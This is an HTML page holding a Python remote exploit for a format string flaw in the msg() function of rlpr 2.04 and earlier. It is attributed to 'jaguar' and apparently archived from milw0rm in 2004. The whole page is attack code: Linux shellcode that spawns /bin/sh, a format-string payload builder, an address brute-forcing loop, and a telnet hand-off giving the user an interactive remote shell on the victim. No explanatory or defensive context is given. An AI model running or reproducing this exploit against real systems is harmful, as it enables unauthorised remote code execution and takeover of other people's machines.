<html><head><title>rlpr <= 2.04 msg() Remote Format String Exploit
</title></head><pre># by jaguar
#!/usr/bin/python
import os, sys, socket, struct, time, telnetlib

class rlprd:
fd = None
pad = 2 

#00000000  31DB              xor ebx,ebx
#00000002  F7E3              mul ebx
#00000004  B003              mov al,0x3
#00000006  80C304            add bl,0x4
#00000009  89E1              mov ecx,esp
#0000000B  4A                dec edx
#0000000C  CC                int3
#0000000D  CD80              int 0x80
#0000000F  FFE1              jmp ecx

# read(4, esp, -1); jmp ecx
lnx_readsc = &quot;\x31\xdb\xf7\xe3\xb0\x03\x80\xc3\x04\x89\xe1\x4a\xcd\x80\xff\xe1&quot;
lnx_stage_one = &quot;\x90&quot; * (23 - len(lnx_readsc)) + lnx_readsc
# dup2 shellcode(4-&gt;0,1,2)
lnx_stage_two  = &quot;\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb2\x3f\x88\xd0\xb3\x04&quot; 
lnx_stage_two += &quot;\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0\x41\xcd\x80&quot;
# execute /bin/sh 
lnx_stage_two += &quot;\x90&quot; * 100
lnx_stage_two += &quot;\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68&quot;
lnx_stage_two += &quot;\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89&quot;
lnx_stage_two += &quot;\xe1\x8d\x42\x0b\xcd\x80&quot;

targets = [ [ 0 ], [ &quot;Compiled test platform&quot;, 0x0804c418, 0xbffff9e8 ] ] 

bruteforce = 0

def __init__(self, host, os, target, port=7290):
self.host = host
self.port = port

set = 0
if(os == &quot;linux&quot;):
set = 1
self.stage_one = self.lnx_stage_one
self.stage_two = self.lnx_stage_two

if(set == 0):
print &quot;Unknown OS&quot;
os._exit()

self.os = os

if(target == 0):
self.bruteforce = 1
else: 
self.args = self.targets[target]

def wl16(self, write_byte):
write_byte += 0x10000
self.already_written %= 0x10000
padding = (write_byte - self.already_written) % 0x10000
if(padding &lt; 10):
padding += 0x10000

self.already_written += padding

return padding

def connect(self):
#if self.fd is not None:
# self.fd.close()
# self.fd = None

self.fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
self.fd.connect((self.host, self.port))

def exploit(self, where, what):
if(not self.fd or self.fd is None): self.connect()
self.already_written = len('gethostbyname(')

#print &quot;# of nops: %d\n&quot; % (23 - len(self.readsc))

exploit = &quot;x&quot; * self.pad
self.already_written += self.pad

exploit += struct.pack(&quot;&lt;l&quot;, where)
exploit += struct.pack(&quot;&lt;l&quot;, where + 2)
self.already_written += 8 

l = self.wl16(what &amp; 0xffff)
fill = &quot;%1$&quot; + str(l) + &quot;u&quot;
exploit += fill

exploit += &quot;%7$hn&quot;

l = self.wl16(what &gt;&gt; 16)
fill = &quot;%1$&quot; + str(l) + &quot;u&quot;
exploit += fill

exploit += &quot;%8$hn&quot;

#print &quot;[*] Format string: (%s) Len: %d&quot; % (exploit, len(exploit))
#print &quot;[*] Stage 1 length: %d&quot; % len(self.stage_one)

#time.sleep(5)
try:
self.fd.send(exploit + self.stage_one + &quot;\n&quot;)
self.fd.send(self.stage_two)
time.sleep(1)
self.fd.send(&quot;echo spawned; uname -a; id -a;\n&quot;)
print &quot;Recieved: &quot; + self.fd.recv(1024)
except:
self.fd.close()
self.fd = None 
print &quot;\tFailed @ 0x%08x&quot; % what
return 0

remote = telnetlib.Telnet()
remote.sock = self.fd
print &quot;[*] You should now have a shell&quot;
remote.interact()
os.exit(0)

def force(self, where, high, lo):
for i in range(high, lo, -8):
r.exploit(where, i)

def run(self):
if(self.bruteforce):
print &quot;Bruteforcing..&quot;
#print &quot;not implemented yet&quot;
#os._exit(1)
for i in range(0x0804c000, 0x0804d000, 0x100 / 6):
print &quot;Trying: 0x%08x&quot; % i
self.force(i, 0xbffffa00, 0xbffff9c0)

#self.exploit(self.args[1], self.args[2])

if __name__ == '__main__':
if(len(sys.argv) != 4):
print &quot;%s host [linux] targetid&quot;
print &quot;- 0 to brute force&quot;
print &quot;- 1 custom compile&quot;
os._exit(0)

print &quot;%s-%s-%s&quot; % (sys.argv[1], sys.argv[2], sys.argv[3])
r = rlprd(sys.argv[1], sys.argv[2], int(sys.argv[3]))
#r.exploit(0x0804c418, 0xbffff9e8)
#r.force(0x0804c418, 0xbffffa00, 0xbffff800)
r.run()


# milw0rm.com [2004-06-25]</pre></html>